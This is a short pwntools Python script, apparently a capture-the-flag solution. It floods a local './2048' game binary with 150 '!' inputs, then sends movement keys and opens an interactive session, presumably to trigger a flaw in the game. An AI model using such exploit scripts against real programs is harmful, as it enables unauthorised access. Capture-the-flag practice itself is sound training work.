#!/usr/bin/env python

from pwn import *

p = process('./2048')

i = 0
while (i < 150):
    p.sendline("!")
    i += 1

p.sendline('w')
p.sendline('a')
p.sendline('s')
p.sendline('d')

p.interactive()
